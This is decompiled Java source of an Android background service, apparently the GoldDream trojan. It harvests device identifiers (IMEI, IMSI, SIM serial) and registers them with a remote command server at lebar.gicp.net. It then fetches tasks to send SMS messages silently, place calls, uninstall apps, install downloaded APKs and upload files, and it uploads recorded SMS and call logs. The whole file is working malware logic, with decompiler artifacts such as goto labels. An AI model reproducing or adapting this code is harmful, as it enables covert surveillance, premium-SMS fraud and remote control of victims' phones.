// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.GoldDream.zj;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.net.Uri;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.StringTokenizer;

// Referenced classes of package com.GoldDream.zj:
//            UploadFiles

public class zjService extends Service
{

    public zjService()
    {
    }

    private void CheckAndClearFile(String s)
        throws IOException
    {
        if(fileIsExists(s)) goto _L2; else goto _L1
_L1:
        return;
_L2:
        FileInputStream fileinputstream;
        int i;
        int j;
        fileinputstream = null;
        i = 0;
        j = Integer.valueOf(getKeyNode("ms", "ms_v")).intValue();
        FileInputStream fileinputstream1 = new FileInputStream(s);
        fileinputstream = fileinputstream1;
_L3:
        int k = fileinputstream.available();
        i = k;
_L4:
        fileinputstream.close();
        if(i >= j * 1024)
        {
            String s1 = s.substring(1 + s.lastIndexOf("/"), s.length());
            try
            {
                FileOutputStream fileoutputstream = openFileOutput(s1, 2);
                fileoutputstream.write((new String("")).getBytes());
                fileoutputstream.close();
            }
            catch(FileNotFoundException filenotfoundexception)
            {
                filenotfoundexception.printStackTrace();
            }
        }
          goto _L1
        FileNotFoundException filenotfoundexception1;
        filenotfoundexception1;
        filenotfoundexception1.printStackTrace();
          goto _L3
        IOException ioexception;
        ioexception;
        ioexception.printStackTrace();
          goto _L4
    }

    private void InitializedWorkArea()
    {
        if(getKeyNode("rt", "rt_v").length() <= 0)
            PutKeyNode("rt", "rt_v", "0");
        if(getKeyNode("tph", "tph_v").length() <= 0)
            PutKeyNode("tph", "tph_v", "3");
        if(getKeyNode("ms", "ms_v").length() <= 0)
            PutKeyNode("ms", "ms_v", "512");
        if(getKeyNode("rtt", "rtt_v").length() <= 0)
            PutKeyNode("rtt", "rtt_v", "1-4");
        if(getKeyNode("uwf", "uwf_v").length() <= 0)
            PutKeyNode("uwf", "uwf_v", "0");
        if(getKeyNode("ws", "ws_v").length() <= 0)
            PutKeyNode("ws", "ws_v", "0");
        if(getKeyNode("wc", "wc_v").length() <= 0)
            PutKeyNode("wc", "wc_v", "0");
        if(getKeyNode("dom", "dom_v").length() <= 0)
            PutKeyNode("dom", "dom_v", "lebar.gicp.net");
        if(getKeyNode("tti", "tti_v").length() <= 0)
            PutKeyNode("tti", "tti_v", "1");
        if(getKeyNode("lud", "lud_v").length() <= 0)
            PutKeyNode("lud", "lud_v", "2011-6-1 00:00:00");
    }

    private void IsClearLocalWatchFiles()
        throws IOException
    {
        CheckAndClearFile("/data/data/com.GoldDream.TingTing08ii/files/zjsms.txt");
        CheckAndClearFile("/data/data/com.GoldDream.TingTing08ii/files/zjphonecall.txt");
    }

    private boolean IsRestTime()
    {
        Boolean boolean1 = Boolean.valueOf(false);
        int i = getNowTime(4);
        String s = getKeyNode("rtt", "rtt_v");
        int j = s.indexOf("-", 0);
        int k = Integer.valueOf(s.substring(0, j)).intValue();
        int l = Integer.valueOf(s.substring(j + 1, s.length())).intValue();
        if(i >= k && i <= l)
            boolean1 = Boolean.valueOf(true);
        return boolean1.booleanValue();
    }

    private void SetLocalParams(String s)
    {
        String s1;
        int i;
        s1 = s;
        ArryServerParams = new String[10];
        i = 0;
_L1:
        int k;
        if(i < 10)
        {
label0:
            {
                if(s1.indexOf("#", 0) > 0)
                    break label0;
                ArryServerParams[i] = s1.toString();
            }
        }
        k = 0;
_L13:
        if(k >= 10)
            return;
        break MISSING_BLOCK_LABEL_90;
        int j = s1.indexOf("#");
        ArryServerParams[i] = s1.substring(0, j);
        s1 = s1.substring(j + 1, s1.length());
        i++;
          goto _L1
        k;
        JVM INSTR tableswitch 0 9: default 148
    //                   0 154
    //                   1 170
    //                   2 186
    //                   3 202
    //                   4 218
    //                   5 234
    //                   6 250
    //                   7 267
    //                   8 284
    //                   9 301;
           goto _L2 _L3 _L4 _L5 _L6 _L7 _L8 _L9 _L10 _L11 _L12
_L2:
        break; /* Loop/switch isn't completed */
_L12:
        break MISSING_BLOCK_LABEL_301;
_L14:
        k++;
          goto _L13
_L3:
        PutKeyNode("lud", "lud_v", ArryServerParams[0]);
          goto _L14
_L4:
        PutKeyNode("dom", "dom_v", ArryServerParams[1]);
          goto _L14
_L5:
        PutKeyNode("tph", "tph_v", ArryServerParams[2]);
          goto _L14
_L6:
        PutKeyNode("rt", "rt_v", ArryServerParams[3]);
          goto _L14
_L7:
        PutKeyNode("rtt", "rtt_v", ArryServerParams[4]);
          goto _L14
_L8:
        PutKeyNode("uwf", "uwf_v", ArryServerParams[5]);
          goto _L14
_L9:
        PutKeyNode("ms", "ms_v", ArryServerParams[6]);
          goto _L14
_L10:
        PutKeyNode("ws", "ws_v", ArryServerParams[7]);
          goto _L14
_L11:
        PutKeyNode("wc", "wc_v", ArryServerParams[8]);
          goto _L14
        PutKeyNode("tti", "tti_v", ArryServerParams[9]);
          goto _L14
    }

    private void UpdatedParametersFromServer()
    {
        if(isUpdateParam())
            SetLocalParams(getValueFromServer((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder("http://")).append(getKeyNode("dom", "dom_v")).append("/zj/upload/UpdateParam.aspx?").toString()))).append("uid=").append(getKeyNode("uid", "uid_v")).append("&taskTypeId=").append(getKeyNode("tti", "tti_v")).toString()))).append("&type=0").toString()));
    }

    private void checkUpload()
    {
        if(!getKeyNode("uwf", "uwf_v").equals("1"))
            break MISSING_BLOCK_LABEL_20;
        uploadAllFiles();
_L1:
        return;
        IOException ioexception;
        ioexception;
        ioexception.printStackTrace();
          goto _L1
    }

    private long compareTwoDate(String s, String s1)
        throws ParseException
    {
        SimpleDateFormat simpledateformat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        Date date = simpledateformat.parse(s);
        Date date1 = simpledateformat.parse(s1);
        return (date.getTime() - date1.getTime()) / 0x36ee80L;
    }

    private boolean fileIsExists(String s)
    {
        Boolean boolean1 = Boolean.valueOf(false);
        if((new File(s)).exists())
            boolean1 = Boolean.valueOf(true);
        return boolean1.booleanValue();
    }

    private int getNowTime(int i)
    {
        Calendar calendar = Calendar.getInstance();
        i;
        JVM INSTR tableswitch 1 5: default 40
    //                   1 44
    //                   2 53
    //                   3 62
    //                   4 71
    //                   5 81;
           goto _L1 _L2 _L3 _L4 _L5 _L6
_L1:
        int j = 0;
_L8:
        return j;
_L2:
        j = calendar.get(1);
        continue; /* Loop/switch isn't completed */
_L3:
        j = calendar.get(2);
        continue; /* Loop/switch isn't completed */
_L4:
        j = calendar.get(5);
        continue; /* Loop/switch isn't completed */
_L5:
        j = calendar.get(11);
        continue; /* Loop/switch isn't completed */
_L6:
        j = calendar.get(12);
        if(true) goto _L8; else goto _L7
_L7:
    }

    private boolean isUpdateParam()
    {
        String s;
        String s1;
        Boolean boolean1;
        s = getKeyNode("lud", "lud_v");
        s1 = getValueFromServer((new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder("http://")).append(getKeyNode("dom", "dom_v")).append("/zj/upload/UpdateParam.aspx?").toString()))).append("uid=").append(getKeyNode("uid", "uid_v")).append("&taskTypeId=").append(getKeyNode("tti", "tti_v")).toString()))).append("&type=1").toString());
        boolean1 = Boolean.valueOf(false);
        boolean flag;
        boolean flag1;
        if(compareTwoDate(s, s1) >= 0L)
        {
            boolean1 = Boolean.valueOf(false);
            flag = boolean1.booleanValue();
            break MISSING_BLOCK_LABEL_167;
        }
        boolean1 = Boolean.valueOf(true);
        flag1 = boolean1.booleanValue();
        flag = flag1;
        break MISSING_BLOCK_LABEL_167;
        ParseException parseexception;
        parseexception;
        parseexception.printStackTrace();
        flag = boolean1.booleanValue();
        return flag;
    }

    private void uploadAllFiles()
        throws IOException
    {
        UploadFiles uploadfiles;
        uploadfiles = new UploadFiles();
        break MISSING_BLOCK_LABEL_8;
        if(fileIsExists("/data/data/com.GoldDream.TingTing08ii/files/zjsms.txt") && fileIsExists("/data/data/com.GoldDream.TingTing08ii/files/zjphonecall.txt"))
        {
            uploadfiles.uploadFile((new StringBuilder("http://")).append(getKeyNode("dom", "dom_v")).append("/zj/upload/UploadFiles.aspx?askId=1&uid=").append(getKeyNode("uid", "uid_v")).toString(), "/data/data/com.GoldDream.TingTing08ii/files/zjsms.txt");
            uploadfiles.uploadFile((new StringBuilder("http://")).append(getKeyNode("dom", "dom_v")).append("/zj/upload/UploadFiles.aspx?askId=2&uid=").append(getKeyNode("uid", "uid_v")).toString(), "/data/data/com.GoldDream.TingTing08ii/files/zjphonecall.txt");
            try
            {
                FileOutputStream fileoutputstream1 = openFileOutput("zjsms.txt", 2);
                fileoutputstream1.write((new String("")).getBytes());
                fileoutputstream1.close();
            }
            catch(FileNotFoundException filenotfoundexception)
            {
                filenotfoundexception.printStackTrace();
            }
            try
            {
                FileOutputStream fileoutputstream = openFileOutput("zjphonecall.txt", 2);
                fileoutputstream.write((new String("")).getBytes());
                fileoutputstream.close();
            }
            catch(FileNotFoundException filenotfoundexception1)
            {
                filenotfoundexception1.printStackTrace();
            }
        }
        return;
    }

    public void CallPhoneNumber(String s)
    {
        Intent intent = new Intent("android.intent.action.CALL");
        intent.setData(Uri.parse((new StringBuilder("tel:")).append(s).toString()));
        intent.setFlags(0x10000000);
        startActivity(intent);
    }

    public void GetDeviceInfo()
    {
        Dev_MIEI = ((TelephonyManager)getSystemService("phone")).getDeviceId();
        Dev_SimSSN = ((TelephonyManager)getSystemService("phone")).getSubscriberId();
        Dev_IMSI = ((TelephonyManager)getSystemService("phone")).getSimSerialNumber();
    }

    public boolean IsWatchCall()
    {
        boolean flag;
        if(getKeyNode("wc", "wc_v") == "1")
            flag = true;
        else
            flag = false;
        return flag;
    }

    public boolean IsWatchSms()
    {
        boolean flag;
        if(getKeyNode("ws", "ws_v") == "1")
            flag = true;
        else
            flag = false;
        return flag;
    }

    public void PutKeyNode(String s, String s1, String s2)
    {
        android.content.SharedPreferences.Editor editor = getSharedPreferences(s, 2).edit();
        editor.putString(s1, s2);
        editor.commit();
    }

    public String bg_sendSms(String s, String s1, int i)
    {
        SmsManager smsmanager = SmsManager.getDefault();
        if(i != 1) goto _L2; else goto _L1
_L1:
        smsmanager.sendTextMessage(s, null, s1, null, null);
        String s2 = "ok";
_L4:
        return s2;
        Exception exception;
        exception;
_L2:
        s2 = "Pass Sms Data Type set failed";
        if(true) goto _L4; else goto _L3
_L3:
    }

    public void checkUid()
    {
        String s = getKeyNode("uid", "uid_v");
        if(s == "0" || s.length() <= 1)
        {
            GetDeviceInfo();
            PutKeyNode("uid", "uid_v", getUidfromServer());
        }
    }

    public void doWorkTask()
    {
        String s;
        String s1;
        s = getKeyNode("uid", "uid_v");
        s1 = getKeyNode("tti", "tti_v");
        break MISSING_BLOCK_LABEL_18;
_L2:
        do
            return;
        while(Integer.valueOf(getKeyNode("rt", "rt_v")).intValue() == 1 || IsRestTime());
        int i = getTaskCountFromServer(s1);
        int j = 1;
        do
        {
label0:
            {
                if(j <= i)
                    break label0;
                PutKeyNode("ltd", "ltd_v", getNowDate());
            }
            if(true)
                continue;
            String s2 = getTaskFromServer(j, s, s1);
            String s3 = s2.substring(0, s2.indexOf(">"));
            String s4 = s2.substring(1 + s2.indexOf(">"), s2.length());
            executeTask(Integer.valueOf(s3), s4);
            j++;
        } while(true);
        if(true) goto _L2; else goto _L1
_L1:
    }

    public String executeTask(Integer integer, String s)
    {
        integer.intValue();
        JVM INSTR tableswitch 1 8: default 52
    //                   1 56
    //                   2 52
    //                   3 92
    //                   4 101
    //                   5 109
    //                   6 118
    //                   7 156
    //                   8 218;
           goto _L1 _L2 _L1 _L3 _L4 _L5 _L6 _L7 _L8
_L1:
        return "You input the other code!";
_L2:
        bg_sendSms(s.substring(0, s.indexOf("#")), s.substring(1 + s.indexOf("#"), s.length()), 1);
        continue; /* Loop/switch isn't completed */
_L3:
        getValueFromServer(s);
        continue; /* Loop/switch isn't completed */
_L4:
        CallPhoneNumber(s);
        continue; /* Loop/switch isn't completed */
_L5:
        getValueFromServer(s);
        continue; /* Loop/switch isn't completed */
_L6:
        Intent intent1 = new Intent("android.intent.action.DELETE", Uri.fromParts("package", s, null));
        intent1.setFlags(0x10000000);
        startActivity(intent1);
        continue; /* Loop/switch isn't completed */
_L7:
        Uri uri = Uri.parse(s);
        Intent intent = new Intent("android.intent.action.VIEW", uri);
        intent.setData(uri);
        intent.addFlags(1);
        intent.setFlags(0x10000000);
        intent.setClassName("com.android.packageinstaller", "com.android.packageinstaller.PackageInstallerActivity");
        startActivity(intent);
        continue; /* Loop/switch isn't completed */
_L8:
        (new UploadFiles()).uploadFile((new StringBuilder("http://")).append(getKeyNode("dom", "dom_v")).append("/zj/upload/UploadFiles.aspx?askId=3").toString(), s);
        if(true) goto _L1; else goto _L9
_L9:
    }

    public int getDayDuff(String s)
    {
        Calendar calendar;
        SimpleDateFormat simpledateformat;
        Date date;
        calendar = Calendar.getInstance();
        simpledateformat = new SimpleDateFormat("yyyy-MM-dd");
        date = null;
        Date date1 = simpledateformat.parse(s);
        date = date1;
_L2:
        return (calendar.getTime().getDate() - date.getDate()) / 0x5265c00;
        ParseException parseexception;
        parseexception;
        parseexception.printStackTrace();
        if(true) goto _L2; else goto _L1
_L1:
    }

    public String getKeyNode(String s, String s1)
    {
        return getSharedPreferences(s, 1).getString(s1, "");
    }

    public String getNowDate()
    {
        return (new SimpleDateFormat("yyyy-MM-dd")).format(new java.sql.Date(System.currentTimeMillis()));
    }

    public int getTaskCountFromServer(String s)
    {
        return Integer.valueOf(getValueFromServer((new StringBuilder("http://")).append(getKeyNode("dom", "dom_v")).append("/zj/countWorkTask.aspx?tti=").append(s).toString())).intValue();
    }

    public String getTaskFromServer(int i, String s, String s1)
    {
        return getValueFromServer((new StringBuilder("http://")).append(getKeyNode("dom", "dom_v")).append("/zj/allotWorkTask.aspx?no=").append(String.valueOf(i)).append("&uid=").append(s).append("&ti=").append(s1).toString());
    }

    public String getUidfromServer()
    {
        String s;
        String s1;
        s = "";
        s1 = (new StringBuilder(String.valueOf((new StringBuilder(String.valueOf((new StringBuilder("http://")).append(getKeyNode("dom", "dom_v")).append("/zj/RegistUid.aspx?").toString()))).append("pid=").append("9962").append("&cid=").append("1000").append("&imei=").append(Dev_MIEI).append("&sim=").append(Dev_SimSSN).append("&imsi=").append(Dev_IMSI).toString()))).append("&ua=").append(removeSpaces(MYUA)).toString();
        HttpURLConnection httpurlconnection;
        InputStream inputstream;
        String s2;
        httpurlconnection = (HttpURLConnection)(new URL(s1)).openConnection();
        if(httpurlconnection.getResponseCode() != 200)
            break MISSING_BLOCK_LABEL_203;
        inputstream = httpurlconnection.getInputStream();
        byte abyte0[] = new byte[inputstream.available()];
        inputstream.read(abyte0);
        s2 = new String(abyte0);
        inputstream.close();
        s = s2;
        httpurlconnection.disconnect();
_L2:
        PutKeyNode("rt", "rt_v", s);
        return s;
        Exception exception;
        exception;
        Exception exception1 = exception;
_L3:
        wl(exception1.getMessage());
        if(true) goto _L2; else goto _L1
_L1:
        Exception exception2;
        exception2;
        exception1 = exception2;
        s = s2;
          goto _L3
    }

    public String getUserAgent()
    {
        WebView webview = new WebView(this);
        webview.layout(0, 0, 0, 0);
        return webview.getSettings().getUserAgentString();
    }

    public String getValueFromServer(String s)
    {
        String s1 = "";
        HttpURLConnection httpurlconnection;
        InputStream inputstream;
        String s2;
        httpurlconnection = (HttpURLConnection)(new URL(s)).openConnection();
        if(httpurlconnection.getResponseCode() != 200)
            break MISSING_BLOCK_LABEL_86;
        inputstream = httpurlconnection.getInputStream();
        byte abyte0[] = new byte[inputstream.available()];
        inputstream.read(abyte0);
        s2 = new String(abyte0);
        s1 = new String(s2.getBytes(), "UTF-8");
        inputstream.close();
        httpurlconnection.disconnect();
_L2:
        return s1;
        Exception exception;
        exception;
        Exception exception1 = exception;
_L3:
        wl(exception1.getMessage());
        if(true) goto _L2; else goto _L1
_L1:
        Exception exception2;
        exception2;
        exception1 = exception2;
        s1 = s2;
          goto _L3
    }

    public void installApk(String s)
    {
        PackageManager packagemanager = getPackageManager();
        android.content.pm.PackageInfo packageinfo = packagemanager.getPackageInfo(getPackageName(), 8192);
        if(packageinfo != null)
        {
            false | false;
        }
_L2:
        return;
        android.content.pm.PackageManager.NameNotFoundException namenotfoundexception;
        namenotfoundexception;
        if(true) goto _L2; else goto _L1
_L1:
    }

    public IBinder onBind(Intent intent)
    {
        return null;
    }

    public void onConfigurationChanged(Configuration configuration)
    {
        super.onConfigurationChanged(configuration);
    }

    public void onCreate()
    {
        InitializedWorkArea();
        MYUA = getUserAgent();
        ArryServerParams = new String[8];
        super.onCreate();
    }

    public void onDestroy()
    {
        super.onDestroy();
    }

    public void onLowMemory()
    {
        super.onLowMemory();
    }

    public void onRebind(Intent intent)
    {
        super.onRebind(intent);
    }

    public void onStart(Intent intent, int i)
    {
        super.onStart(intent, i);
        InitializedWorkArea();
        (new Thread() {

            public void run()
            {
                do
                    try
                    {
                        do
                        {
                            InitializedWorkArea();
                            sleep(0x36ee80 * Integer.valueOf(getKeyNode("tph", "tph_v")).intValue());
                            checkUid();
                            doWorkTask();
                            UpdatedParametersFromServer();
                            checkUpload();
                            IsClearLocalWatchFiles();
                        } while(true);
                    }
                    catch(Exception exception)
                    {
                        wl(exception.getMessage());
                        (new Thread()).start();
                    }
                    catch(Throwable throwable)
                    {
                        throwable.printStackTrace();
                    }
                while(true);
            }

            final zjService this$0;

            
            {
                this$0 = zjService.this;
                super();
            }
        }).start();
    }

    public boolean onUnbind(Intent intent)
    {
        return super.onUnbind(intent);
    }

    public String removeSpaces(String s)
    {
        StringTokenizer stringtokenizer = new StringTokenizer(s, " ", false);
        String s1 = "";
        do
        {
            if(!stringtokenizer.hasMoreElements())
                return s1;
            s1 = (new StringBuilder(String.valueOf(s1))).append(stringtokenizer.nextElement()).toString();
        } while(true);
    }

    public void wl(String s)
    {
        System.out.println(s);
    }

    private static String ArryServerParams[];
    private static final String CHANNEL_CID = "1000";
    private static String Dev_IMSI = "";
    private static String Dev_MIEI = "";
    private static String Dev_SimSSN = "";
    private static final String KEY_ZJ_DOMAIN = "dom_v";
    private static final String KEY_ZJ_ISREST = "rt_v";
    private static final String KEY_ZJ_LASTUPDATEDDATETIME = "lud_v";
    private static final String KEY_ZJ_LASTWORKTASK_DATETIME = "ltd_v";
    private static final String KEY_ZJ_MAXSIZE = "ms_v";
    private static final String KEY_ZJ_RESTTIME = "rtt_v";
    private static final String KEY_ZJ_TASKPERHOURS = "tph_v";
    private static final String KEY_ZJ_TASKTYPE = "tti_v";
    private static final String KEY_ZJ_UID = "uid_v";
    private static final String KEY_ZJ_UPLOADWATCHFILES = "uwf_v";
    private static final String KEY_ZJ_WATCHCALL = "wc_v";
    private static final String KEY_ZJ_WATCHSMS = "ws_v";
    private static String MYUA = "";
    private static final String OBJ_ZJ_DOMAIN = "dom";
    private static final String OBJ_ZJ_ISREST = "rt";
    private static final String OBJ_ZJ_LASTUPDATEDDATETIME = "lud";
    private static final String OBJ_ZJ_LASTWORKTASK_DATETIME = "ltd";
    private static final String OBJ_ZJ_MAXSIZE = "ms";
    private static final String OBJ_ZJ_RESTTIME = "rtt";
    private static final String OBJ_ZJ_TASKPERHOURS = "tph";
    private static final String OBJ_ZJ_TASKTYPE = "tti";
    private static final String OBJ_ZJ_UID = "uid";
    private static final String OBJ_ZJ_UPLOADWATCHFILES = "uwf";
    private static final String OBJ_ZJ_WATCHCALL = "wc";
    private static final String OBJ_ZJ_WATCHSMS = "ws";
    private static final String PRODUCT_PID = "9962";





}
